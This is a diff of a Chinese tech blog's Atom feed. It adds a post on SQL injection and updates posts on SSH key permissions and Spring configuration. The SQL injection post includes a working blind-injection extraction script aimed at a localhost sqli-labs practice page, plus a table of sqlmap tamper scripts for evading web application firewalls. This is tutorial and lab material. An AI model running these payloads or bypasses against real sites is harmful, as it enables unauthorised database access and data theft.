@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://blog.qwerdf.com/"/>
-  <updated>2018-03-30T16:38:22.201Z</updated>
+  <updated>2018-04-09T17:37:05.186Z</updated>
   <id>http://blog.qwerdf.com/</id>
   
   <author>
@@ -15,16 +15,287 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[sql injection]]></title>
+    <link href="http://blog.qwerdf.com/2018/04/06/sql/"/>
+    <id>http://blog.qwerdf.com/2018/04/06/sql/</id>
+    <published>2018-04-06T11:19:18.000Z</published>
+    <updated>2018-04-09T17:37:05.186Z</updated>
+    <content type="html"><![CDATA[<p>SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.</p>
+<p>SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐</p>
+<h1 id="我选择IE6">我选择IE6</h1><p>有比在IE里面上网冲浪更快乐的事情么?<br><a id="more"></a></p>
+<h1 id="我选择自写脚本">我选择自写脚本</h1><p>自写脚本更能针对化的对应环境,对于白盒测试<del>或者批量</del>值得使用.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_table = <span class="string">"""select group_concat(distinct table_name) from """</span> + \</span><br><span class="line">                         <span class="string">"""information_schema.columns where table_schema=database()"""</span></span><br><span class="line">        self.get_database = <span class="string">"""select database()"""</span></span><br><span class="line">        self.get_version = <span class="string">"""select @@version"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success_by_boolen</span><span class="params">(get_url)</span>:</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">"User-Agent"</span>: ua.random&#125;</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    success = <span class="string">"Your Login name"</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success_by_time</span><span class="params">(get_url)</span>:</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">"User-Agent"</span>: ua.random&#125;</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    offset = after_time - before_time</span><br><span class="line">    success = <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> success &lt; offset:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_fun</span><span class="params">(sql_fun)</span>:</span></span><br><span class="line">    url = <span class="string">r"""http://localhost/sqlilabs/practice/example1.php?id=1' and (&#123;0&#125;) --+"""</span></span><br><span class="line">    <span class="comment"># Timing-based Blind SQL Attacks</span></span><br><span class="line">    <span class="comment"># url = r"""http://localhost/sqlilabs/practice/example1.php?id=1' and if((&#123;0&#125;),sleep(10),0) --+"""</span></span><br><span class="line"></span><br><span class="line">    _long = -<span class="number">1</span></span><br><span class="line">    out = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999</span>, <span class="number">1</span>):</span><br><span class="line">        sql = <span class="string">"""LENGTH((&#123;0&#125;))=&#123;1&#125;"""</span>.format(sql_fun, i)</span><br><span class="line">        <span class="keyword">if</span> is_success_by_boolen(url.format(sql)):</span><br><span class="line">            _long = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, _long, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:<span class="comment">#<span class="doctag">TODO:</span> 二分法优化</span></span><br><span class="line">            sql = <span class="string">"""(substr((&#123;0&#125;),&#123;1&#125;,1))=("&#123;2&#125;")"""</span>.format(sql_fun, i, j)</span><br><span class="line">            <span class="keyword">if</span> is_success_by_boolen(url.format(sql)):</span><br><span class="line">                out += <span class="string">''</span> + j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"&#123;0&#125;:  &#123;1&#125;"</span>.format(Example().get_version, sql_fun(Example().get_version))</span><br></pre></td></tr></table></figure></p>
+<h1 id="我选择sqlmap">我选择sqlmap</h1><p>sqlmap内置有万能的脚本,对于黑盒测试值得使用.</p>
+<table>
+<thead>
+<tr>
+<th>脚本</th>
+<th>直译</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>apostrophemask</td>
+<td>单引号伪装</td>
+<td>使用<em>UTF-8</em></td>
+</tr>
+<tr>
+<td>apostrophenullencode</td>
+<td>单引号null编码</td>
+<td>用双字节的unicode字符</td>
+</tr>
+<tr>
+<td>appendnullbyte</td>
+<td>尾部添加null字节</td>
+<td></td>
+</tr>
+<tr>
+<td>base64encode</td>
+<td>base64编码</td>
+</tr>
+<tr>
+<td>between</td>
+<td>即<em>between</em></td>
+<td>替换 <em>&lt;</em> <em>=</em> <em>&gt;</em></td>
+</tr>
+<tr>
+<td>bluecoat</td>
+<td>bypass Blue Coat Systems</td>
+<td>老外的公司</td>
+</tr>
+<tr>
+<td>chardoubleencode</td>
+<td>字符两次编码</td>
+<td>即两次url编码</td>
+</tr>
+<tr>
+<td>charencode</td>
+<td>…</td>
+<td></td>
+</tr>
+<tr>
+<td>charunicodeencode</td>
+<td>字符unicode编码</td>
+<td>即 <em>%uxxxx</em> 编码</td>
+</tr>
+<tr>
+<td>charunicodeescape</td>
+<td>字符unicode转义</td>
+<td>即 <em>\uxxxx</em> 编码</td>
+</tr>
+<tr>
+<td>commalessmid</td>
+<td>mid更少的逗号</td>
+<td>MID(A,B,C) –&gt; MID(A FROM B FOR C)</td>
+</tr>
+<tr>
+<td>commalesslimit</td>
+<td>limit更少的逗号</td>
+<td>LIMIT M, N –&gt; LIMIT N OFFSET M</td>
+</tr>
+<tr>
+<td>commentbeforeparentheses</td>
+<td>括号之前注释</td>
+<td></td>
+</tr>
+<tr>
+<td>concat2concatws</td>
+<td>concat –&gt; concat_ws</td>
+<td></td>
+</tr>
+<tr>
+<td>equaltolike</td>
+<td><em>=</em> –&gt; <em>like</em></td>
+<td></td>
+</tr>
+<tr>
+<td>escapequotes</td>
+<td>转义引号</td>
+<td>引号前面加 <strong>\\</strong>  (意义?)</td>
+</tr>
+<tr>
+<td>greatest</td>
+<td>GREATEST()</td>
+<td>返回参数的最大值,用于替换<em>and</em>后的 <em>&gt;</em></td>
+</tr>
+<tr>
+<td>halfversionedmorekeywords</td>
+<td><em>更多的关键字在一半的版本上</em>(?)</td>
+<td>即加注释,如 <em>/\</em>!0UNION*<br>(MySQL &lt; 5.1)</td>
+</tr>
+<tr>
+<td>htmlencode</td>
+<td>html编码</td>
+<td>即 <em>&#xx;</em> 编码</td>
+</tr>
+<tr>
+<td>ifnull2casewhenisnull</td>
+<td>IFNULL() –&gt;CASE WHEN ISNULL()</td>
+<td>没见过的操作</td>
+</tr>
+<tr>
+<td>ifnull2ifisnull</td>
+<td>IFNULL()–&gt;IF ISNULL()</td>
+<td>…</td>
+</tr>
+<tr>
+<td>informationschemacomment</td>
+<td>information_schema注释</td>
+<td>information_schema/**/.table</td>
+</tr>
+<tr>
+<td>least</td>
+<td>LEAST()</td>
+<td>返回参数的最小值,用于替换<em>and</em>后的 <em>&gt;</em></td>
+</tr>
+<tr>
+<td>lowercase</td>
+<td>小写</td>
+<td></td>
+</tr>
+<tr>
+<td>modsecurityversioned</td>
+<td><em>ModSecurity版本</em>(?)</td>
+<td>开源的WAF</td>
+</tr>
+<tr>
+<td>modsecurityzeroversioned</td>
+<td><em>ModSecurity零版本</em>(?)</td>
+<td>..</td>
+</tr>
+<tr>
+<td>multiplespaces</td>
+<td>多个空格</td>
+<td>就是瞎鸡儿加空格</td>
+</tr>
+<tr>
+<td>nonrecursivereplacement</td>
+<td>非递归替换</td>
+<td>union –&gt; uni<strong>union</strong>on</td>
+</tr>
+<tr>
+<td>overlongutf8</td>
+<td>超长的UTF-8</td>
+<td>即 <em>%xx%xx</em> 编码(不转换字母)</td>
+</tr>
+<tr>
+<td>overlongutf8more</td>
+<td>更长的UTF-8</td>
+<td>即 <em>%xx%xx</em> 编码…(转换字母)</td>
+</tr>
+<tr>
+<td>percentage</td>
+<td>百分号</td>
+<td>select –&gt; S%E%L%E%C%T</td>
+</tr>
+<tr>
+<td>plus2concat</td>
+<td>+ –&gt; CONCAT()</td>
+<td>适用于(char(x)+char(x))</td>
+</tr>
+<tr>
+<td>plus2fnconcat</td>
+<td>+ –&gt; {fn CONCAT()}</td>
+<td>ODBC only</td>
+</tr>
+<tr>
+<td>randomcase</td>
+<td>随机大小写</td>
+<td></td>
+</tr>
+<tr>
+<td>randomcomments</td>
+<td>随机注释</td>
+<td><strong>/**/</strong></td>
+</tr>
+<tr>
+<td>securesphere</td>
+<td>SecureSphere</td>
+<td>WAF</td>
+</tr>
+<tr>
+<td>sp_password</td>
+<td>sp_password</td>
+<td>日志</td>
+</tr>
+<tr>
+<td>space2*</td>
+<td>spacee -&gt; *</td>
+</tr>
+<tr>
+<td>symboliclogical</td>
+<td>逻辑符号</td>
+<td>AND/OR -&gt; &amp;&amp;/\</td>
+<td>\</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>unionalltounion</td>
+<td>union all -&gt; union</td>
+<td></td>
+</tr>
+<tr>
+<td>unmagicquotes</td>
+<td>魔术引号</td>
+<td>即%bf%27,神奇的<strong>縗’</strong></td>
+</tr>
+<tr>
+<td>uppercase</td>
+<td>大写</td>
+<td></td>
+</tr>
+<tr>
+<td>varnish</td>
+<td>Varnish</td>
+<td>WAF</td>
+</tr>
+<tr>
+<td>versionedkeywords</td>
+<td><em>版本的关键字</em>(?)</td>
+<td>即/!*select/,不包括函数</td>
+</tr>
+<tr>
+<td>versionedmorekeywords</td>
+<td><em>更多的版本的关键字</em>(?)</td>
+<td>即/!*select/,包括函数</td>
+</tr>
+<tr>
+<td>xforwardedfor</td>
+<td>X-Forwarded-For</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1 id="我选择”啊D”">我选择”啊D”</h1><p>是…是大佬呢…</p>
+<!--小弟我对大佬你的景仰犹如滔滔江水连绵不绝又如黄河泛滥一发不可收拾天地可证日月可鉴。-->
+<h1 id="参考链接:"><h4>参考链接:</h4></h1><p><a href="https://mariadb.com/kb/en/library/string-functions/" target="_blank" rel="external">Sql中操纵字符串的函数方法</a></p>
+<p><a href="https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423" target="_blank" rel="external">SQLMap Tamper Scripts (SQL Injection and WAF bypass)</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.</p>
+<p>SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐</p>
+<h1 id="我选择IE6">我选择IE6</h1><p>有比在IE里面上网冲浪更快乐的事情么?<br>]]>
+    
+    </summary>
+    
+      <category term="security" scheme="http://blog.qwerdf.com/tags/security/"/>
+    
+      <category term="sql" scheme="http://blog.qwerdf.com/tags/sql/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[记一次诡异的ssh密钥登录失败]]></title>
     <link href="http://blog.qwerdf.com/2018/03/31/unable-login-SSH-with-key/"/>
     <id>http://blog.qwerdf.com/2018/03/31/unable-login-SSH-with-key/</id>
     <published>2018-03-30T16:21:55.000Z</published>
-    <updated>2018-03-30T16:38:22.201Z</updated>
+    <updated>2018-03-30T19:03:24.603Z</updated>
     <content type="html"><![CDATA[<p>问基友要了台服务器,密码与密钥均不能登陆.改了密码后可以登陆,但密钥依然不能登陆.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_19_31_centos ~]<span class="comment"># ls -al                               </span></span><br><span class="line">total <span class="number">80</span>                                                       </span><br><span class="line">drwxrwxrwx.  <span class="number">3</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                  </span><br><span class="line">dr-xr-xr-x. <span class="number">24</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">51</span> ..</span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root   <span class="number">790</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">07</span> .bash_<span class="built_in">history</span>      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root    <span class="number">18</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_<span class="built_in">logout</span>       </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_profile      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> Sep <span class="number">23</span>  <span class="number">2004</span> .bashrc            </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">100</span> Sep <span class="number">23</span>  <span class="number">2004</span> .cshrc             </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root <span class="number">12754</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log        </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root  <span class="number">5520</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log.syslog      </span><br><span class="line">drwxrwxrwx   <span class="number">2</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .ssh               </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">129</span> Dec  <span class="number">4</span>  <span class="number">2004</span> .tcshrc            </span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root  <span class="number">1005</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .viminfo           </span><br><span class="line">[root@VM_19_31_centos ~]<span class="comment"># cd .ssh/</span></span><br><span class="line">[root@VM_19_31_centos .ssh]<span class="comment"># ls -al                            </span></span><br><span class="line">total <span class="number">12</span>                                                       </span><br><span class="line">drwxrwxrwx  <span class="number">2</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                    </span><br><span class="line">drwxrwxrwx. <span class="number">3</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> ..                   </span><br><span class="line">-rwxrwxrwx  <span class="number">1</span> root root <span class="number">1157</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">08</span> authorized_keys</span><br></pre></td></tr></table></figure>
 <p>明显<em>.ssh/</em>与<em>authorized_keys</em>权限设置错误,改之</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> ~/.ssh</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-<p>退出登录,然而依然不能用密钥登陆…猜测是<em>sshd</em>配置问题.去sshd_config查看</p>
+<p>退出登录,然而依然不能用密钥登陆…<br><a id="more"></a><br>猜测是<em>sshd</em>配置问题.去sshd_config查看</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RSAAuthentication yes</span></span><br><span class="line"><span class="comment">#PubkeyAuthentication yes</span></span><br><span class="line"><span class="comment">#AuthorizedKeysFile       .ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
 <p>取消注释,重启sshd服务,退出登录,问题依旧……<br>谷歌之,用<em>ssh -vv server</em>来查看登陆日志,发现报<em>we did not send a packet, disable method</em><br><img src="/uploads/2018-03-31_1.png" alt="we did not send a packet, disable method"><br>谷歌之,发现是<em>~</em>的权限设置<a href="https://unix.stackexchange.com/questions/205842/unable-to-login-with-ssh-rsa-key" target="_blank" rel="external">问题</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">755</span> ~</span><br></pre></td></tr></table></figure>
@@ -32,10 +303,16 @@
 ]]></content>
     <summary type="html">
     <![CDATA[<p>问基友要了台服务器,密码与密钥均不能登陆.改了密码后可以登陆,但密钥依然不能登陆.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</spa]]>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_19_31_centos ~]<span class="comment"># ls -al                               </span></span><br><span class="line">total <span class="number">80</span>                                                       </span><br><span class="line">drwxrwxrwx.  <span class="number">3</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                  </span><br><span class="line">dr-xr-xr-x. <span class="number">24</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">51</span> ..</span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root   <span class="number">790</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">07</span> .bash_<span class="built_in">history</span>      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root    <span class="number">18</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_<span class="built_in">logout</span>       </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_profile      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> Sep <span class="number">23</span>  <span class="number">2004</span> .bashrc            </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">100</span> Sep <span class="number">23</span>  <span class="number">2004</span> .cshrc             </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root <span class="number">12754</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log        </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root  <span class="number">5520</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log.syslog      </span><br><span class="line">drwxrwxrwx   <span class="number">2</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .ssh               </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">129</span> Dec  <span class="number">4</span>  <span class="number">2004</span> .tcshrc            </span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root  <span class="number">1005</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .viminfo           </span><br><span class="line">[root@VM_19_31_centos ~]<span class="comment"># cd .ssh/</span></span><br><span class="line">[root@VM_19_31_centos .ssh]<span class="comment"># ls -al                            </span></span><br><span class="line">total <span class="number">12</span>                                                       </span><br><span class="line">drwxrwxrwx  <span class="number">2</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                    </span><br><span class="line">drwxrwxrwx. <span class="number">3</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> ..                   </span><br><span class="line">-rwxrwxrwx  <span class="number">1</span> root root <span class="number">1157</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">08</span> authorized_keys</span><br></pre></td></tr></table></figure>
+<p>明显<em>.ssh/</em>与<em>authorized_keys</em>权限设置错误,改之</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> ~/.ssh</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p>退出登录,然而依然不能用密钥登陆…<br>]]>
+    
     </summary>
     
       <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
+    
+      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
     
   </entry>
   
@@ -44,7 +321,7 @@
     <link href="http://blog.qwerdf.com/2018/03/16/ssm/"/>
     <id>http://blog.qwerdf.com/2018/03/16/ssm/</id>
     <published>2018-03-16T06:13:38.000Z</published>
-    <updated>2018-03-29T17:01:37.533Z</updated>
+    <updated>2018-03-30T19:22:56.637Z</updated>
     <content type="html"><![CDATA[<h1 id="SSM:">SSM:</h1><p>即是<strong>S</strong>pring <strong>S</strong>pringMVC <strong>M</strong>ybatis的开头字母</p>
 <h1 id="Spring">Spring</h1><p><img src="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle/images/spring-overview.png" alt="Spring Framework Runtime"></p>
 <p><strong>S</strong>SM里的Spring其实主要常用的是IoC和Aop,还有Test</p>
@@ -58,6 +335,8 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor"</span>/&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 使@Autowired可用" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.CommonAnnotationBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使Common(@Resource,@PostConstruct,@PreDestroy)可用(?) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.RequiredAnnotationBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使@Required可用" --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">class</span>=<span class="value">"org.springframework.beans.factory.annotation.PersistenceAnnotationBeanPostProcessor "</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 使@PersistenceContext可用(?)"</span><br><span class="line">&lt;!------------------或者---------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一条等于上面四条,但无法使用@Component,即还是要把这个类的bean配置一下,如在xml里配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">context:annotation-config</span> /&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-----------------或者----------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一条等于上面一条,并且可以使用@Component,从指定package开始递归扫描 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">context:component-scan</span> <span class="attribute">base-package</span>=<span class="value">"com.test.pojo.human"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="基于java配置类的配置">基于java配置类的配置</h3><p>即是将xml配置文件里的配置提出来,放到一个java文件里,成为一个配置类.这样的好处即是不需要xml文件了,实现去xml化.</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//btw spring boot里的@SpringBootApplication一条等于@Configuration,@EnableAutoConfiguration,@ComponentScan三条</span></span><br><span class="line"><span class="comment">//@ComponentScan("com.test.pojo.human")开启扫描</span></span><br><span class="line"><span class="annotation">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Configuration_or_somefckingothernamebutendwithConfig</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configuration_or_somefckingothername</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@Bean("name2")</span></span><br><span class="line">    <span class="annotation">@Bean</span>(name=&#123;<span class="string">"infoX"</span>,<span class="string">"InformationX"</span>,<span class="string">"name2"</span>&#125;)</span><br><span class="line">    <span class="annotation">@Scope</span>(<span class="string">"singleton"</span>)<span class="comment">//Bean的实例如何创建,生命周期</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InformationX <span class="title">info_or_others</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InformationX();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="annotation">@Bean</span></span><br><span class="line">    <span class="annotation">@Description</span>(<span class="string">"一些描述"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> human <span class="title">human_or_others</span><span class="params">(InformationX infoX,String n)</span></span>&#123;</span><br><span class="line">        human a= <span class="keyword">new</span> human();</span><br><span class="line">        human.setNameX(n);</span><br><span class="line">        human.setInformationX(infoX);</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<!--2018-03-31-->
+<p>btw: Scope标识此bean的作用域,常在多线程问题中使用.</p>
 <h3 id="什么时候该在xml里定义bean什么时候该用扫描">什么时候该在xml里定义bean什么时候该用扫描</h3><ul>
 <li><p>在xml里定义bean</p>
